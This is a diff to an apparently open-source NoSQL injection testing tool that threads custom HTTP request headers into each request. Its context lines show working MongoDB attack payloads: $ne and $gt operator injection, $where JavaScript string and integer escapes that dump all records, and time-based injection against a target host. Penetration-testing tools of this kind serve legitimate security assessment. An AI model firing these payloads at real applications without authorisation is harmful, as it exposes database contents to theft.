@@ -166,6 +166,7 @@ def options():
 	global verb
 	global mmSelect
 	global dbPort
+	global requestHeaders
 
 	#Set default value if needed
 	if optionSet[0] == False:
@@ -298,6 +299,12 @@ def options():
 					httpMethod = "POST"
 				else:
 					print "Invalid selection"
+
+				reqHeadersIn = raw_input("Enter HTTP Request Header data in a comma separated list (i.e. header name 1,value1,header name 2,value2)\n")
+				reqHeadersArray = reqHeadersIn.split(",")
+				headerNames = reqHeadersArray[0::2]
+				headerValues = reqHeadersArray[1::2]
+				requestHeaders = dict(zip(headerNames, headerValues))
 
 		elif select == "7":
 			#Unset the setting boolean since we're setting it again.
@@ -447,6 +454,7 @@ def postApps():
 	global postData
 	global neDict
 	global gtDict
+	global requestHeaders
 	testNum = 1
 
 	#Verify app is working.
@@ -460,7 +468,7 @@ def postApps():
 
 	try:
 		body = urllib.urlencode(postData)
-		req = urllib2.Request(appURL,body)
+		req = urllib2.Request(appURL,body, requestHeaders)
 		appRespCode = urllib2.urlopen(req).getcode()
 
 		if appRespCode == 200:
@@ -515,7 +523,7 @@ def postApps():
 			print "Sending random parameter value..."
 
 		body = urllib.urlencode(postData)
-		req = urllib2.Request(appURL,body)
+		req = urllib2.Request(appURL,body, requestHeaders)
 		randLength = int(len(urllib2.urlopen(req).read()))
 		print "Got response length of " + str(randLength) + "."
 
@@ -531,7 +539,7 @@ def postApps():
 		neDict[injOpt + "[$ne]"] = neDict[injOpt]
 		del neDict[injOpt]
 		body = urllib.urlencode(neDict)
-		req = urllib2.Request(appURL,body)
+		req = urllib2.Request(appURL,body, requestHeaders)
 		if verb == "ON":
 			print "Testing Mongo PHP not equals associative array injection using " + str(postData) +"..."
 
@@ -558,7 +566,7 @@ def postApps():
 		gtDict[injOpt + "[$gt]"] = gtDict[injOpt]
 		del gtDict[injOpt]
 		body = urllib.urlencode(gtDict)
-		req = urllib2.Request(appURL,body)
+		req = urllib2.Request(appURL,body, requestHeaders)
 		if verb == "ON":
 			print "Testing PHP/ExpressJS >Undefined Injection using " + str(postData) + "..."
 
@@ -574,7 +582,7 @@ def postApps():
 
 		postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
 		body = urllib.urlencode(postData)
-		req = urllib2.Request(appURL,body)
+		req = urllib2.Request(appURL,body, requestHeaders)
 		if verb == "ON":
 			print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
 			print "Injecting " + str(postData)
@@ -595,7 +603,7 @@ def postApps():
 
 		postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
 		body = urllib.urlencode(postData)
-		req = urllib2.Request(appURL,body)
+		req = urllib2.Request(appURL,body, requestHeaders)
 		if verb == "ON":
 			print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
 			print "Injecting " + str(postData)
@@ -615,7 +623,7 @@ def postApps():
 		#Start a single record attack in case the app expects only one record back
 		postData.update({injOpt:"a'; return db.a.findOne(); var dummy='!"})
 		body = urllib.urlencode(postData)
-		req = urllib2.Request(appURL,body)
+		req = urllib2.Request(appURL,body, requestHeaders)
 		if verb == "ON":
 			print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
 			print " Injecting " + str(postData)
@@ -636,7 +644,7 @@ def postApps():
 
 		postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
 		body = urllib.urlencode(postData)
-		req = urllib2.Request(appURL,body)
+		req = urllib2.Request(appURL,body, requestHeaders)
 		if verb == "ON":
 			print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
 			print " Injecting " + str(postData)
@@ -657,7 +665,7 @@ def postApps():
 
 		postData.update({injOpt:"a'; return this.a != '" + injectString + "'; var dummy='!"})
 		body = urllib.urlencode(postData)
-		req = urllib2.Request(appURL,body)
+		req = urllib2.Request(appURL,body, requestHeaders)
 
 		if verb == "ON":
 			print "Testing Mongo this not equals string escape attack for all records..."
@@ -678,7 +686,7 @@ def postApps():
 
 		postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
 		body = urllib.urlencode(postData)
-		req = urllib2.Request(appURL,body)
+		req = urllib2.Request(appURL,body, requestHeaders)
 
 		if verb == "ON":
 			print "Testing Mongo this not equals integer escape attack for all records..."
@@ -812,6 +820,7 @@ def getApps():
 	str24 = False
 	global int24
 	int24 = False
+	global requestHeaders
 
 	#Verify app is working.
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
@@ -822,10 +831,11 @@ def getApps():
 	elif https == "ON":
 		appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
 	try:
-		appRespCode = urllib.urlopen(appURL).getcode()
+		req = urllib2.Request(appURL, None, requestHeaders)
+		appRespCode = urllib2.urlopen(req).getcode()
 		if appRespCode == 200:
-			normLength = int(len(urllib.urlopen(appURL).read()))
-			timeReq = urllib.urlopen(appURL)
+			normLength = int(len(urllib2.urlopen(req).read()))
+			timeReq = urllib2.urlopen(req)
 			start = time.time()
 			page = timeReq.read()
 			end = time.time()
@@ -853,13 +863,15 @@ def getApps():
 		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
 		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
 		randomUri = buildUri(appURL,injectString)
+		print "URI : " + randomUri
+		req = urllib2.Request(randomUri, None, requestHeaders)
 
 		if verb == "ON":
 			print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
 		else:
 			print "Sending random parameter value..."
 
-		randLength = int(len(urllib.urlopen(randomUri).read()))
+		randLength = int(len(urllib2.urlopen(req).read()))
 		print "Got response length of " + str(randLength) + "."
 		randNormDelta = abs(normLength - randLength)
 
@@ -874,10 +886,11 @@ def getApps():
 			print "Test 1: PHP/ExpressJS != associative array injection"
 
 		#Test for errors returned by injection
-		errorCheck = errorTest(str(urllib.urlopen(uriArray[1]).read()),testNum)
+		req = urllib2.Request(uriArray[1], None, requestHeaders)
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 
 		if errorCheck == False:
-			injLen = int(len(urllib.urlopen(uriArray[1]).read()))
+			injLen = int(len(urllib2.urlopen(req).read()))
 			checkResult(randLength,injLen,testNum)
 			testNum += 1
 		else:
@@ -890,12 +903,12 @@ def getApps():
 		else:
 			print "Test 2: $where injection (string escape)"
 
-
-		errorCheck = errorTest(str(urllib.urlopen(uriArray[2]).read()),testNum)
+		req = urllib2.Request(uriArray[2], None, requestHeaders)
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 
 
 		if errorCheck == False:
-			injLen = int(len(urllib.urlopen(uriArray[2]).read()))
+			injLen = int(len(urllib2.urlopen(req).read()))
 			checkResult(randLength,injLen,testNum)
 			testNum += 1
 
@@ -909,11 +922,12 @@ def getApps():
 		else:
 			print "Test 3:  $where injection (integer escape)"
 
-		errorCheck = errorTest(str(urllib.urlopen(uriArray[3]).read()),testNum)
+		req = urllib2.Request(uriArray[3], None, requestHeaders)
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 
 
 		if errorCheck == False:
-			injLen = int(len(urllib.urlopen(uriArray[3]).read()))
+			injLen = int(len(urllib2.urlopen(req).read()))
 			checkResult(randLength,injLen,testNum)
 			testNum +=1
 
@@ -928,11 +942,11 @@ def getApps():
 		else:
 			print "Test 4: $where injection string escape (single record)"
 
-
-		errorCheck = errorTest(str(urllib.urlopen(uriArray[4]).read()),testNum)
+		req = urllib2.Request(uriArray[4], None, requestHeaders)
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 
 		if errorCheck == False:
-			injLen = int(len(urllib.urlopen(uriArray[4]).read()))
+			injLen = int(len(urllib2.urlopen(req).read()))
 			checkResult(randLength,injLen,testNum)
 			testNum += 1
 		else:
@@ -945,10 +959,11 @@ def getApps():
 		else:
 			print "Test 5: $where injection integer escape (single record)"
 
-		errorCheck = errorTest(str(urllib.urlopen(uriArray[5]).read()),testNum)
+		req = urllib2.Request(uriArray[5], None, requestHeaders)
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 
 		if errorCheck == False:
-			injLen = int(len(urllib.urlopen(uriArray[5]).read()))
+			injLen = int(len(urllib2.urlopen(req).read()))
 			checkResult(randLength,injLen,testNum)
 			testNum +=1
 
@@ -962,10 +977,11 @@ def getApps():
 		else:
 			print "Test 6: This != injection (string escape)"
 
-		errorCheck = errorTest(str(urllib.urlopen(uriArray[6]).read()),testNum)
+		req = urllib2.Request(uriArray[6], None, requestHeaders)
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 
 		if errorCheck == False:
-			injLen = int(len(urllib.urlopen(uriArray[6]).read()))
+			injLen = int(len(urllib2.urlopen(req).read()))
 			checkResult(randLength,injLen,testNum)
 			testNum += 1
 		else:
@@ -978,10 +994,11 @@ def getApps():
 		else:
 			print "Test 7: This != injection (integer escape)"
 
-		errorCheck = errorTest(str(urllib.urlopen(uriArray[7]).read()),testNum)
+		req = urllib2.Request(uriArray[7], None, requestHeaders)
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 
 		if errorCheck == False:
-			injLen = int(len(urllib.urlopen(uriArray[7]).read()))
+			injLen = int(len(urllib2.urlopen(req).read()))
 			checkResult(randLength,injLen,testNum)
 			testNum += 1
 		else:
@@ -995,10 +1012,11 @@ def getApps():
 		else:
 			print "Test 8: PHP/ExpressJS > Undefined Injection"
 
-		errorCheck = errorTest(str(urllib.urlopen(uriArray[8]).read()),testNum)
+		req = urllib2.Request(uriArray[8], None, requestHeaders)
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 
 		if errorCheck == False:
-			injLen = int(len(urllib.urlopen(uriArray[8]).read()))
+			injLen = int(len(urllib2.urlopen(req).read()))
 			checkResult(randLength,injLen,testNum)
 			testNum += 1
 
@@ -1006,8 +1024,9 @@ def getApps():
 
 		if doTimeAttack in yes_tag:
 			print "Starting Javascript string escape time based injection..."
+			req = urllib2.Request(uriArray[18], None, requestHeaders)
 			start = time.time()
-			strTimeInj = urllib.urlopen(uriArray[18])
+			strTimeInj = urllib2.urlopen(req)
 			page = strTimeInj.read()
 			end = time.time()
 			strTimeInj.close()
@@ -1024,8 +1043,9 @@ def getApps():
 				strTbAttack = False
 
 			print "Starting Javascript integer escape time based injection..."
+			req = urllib2.Request(uriArray[9], None, requestHeaders)
 			start = time.time()
-			intTimeInj = urllib.urlopen(uriArray[9])
+			intTimeInj = urllib2.urlopen(req)
 			page = intTimeInj.read()
 			end = time.time()
 			intTimeInj.close()
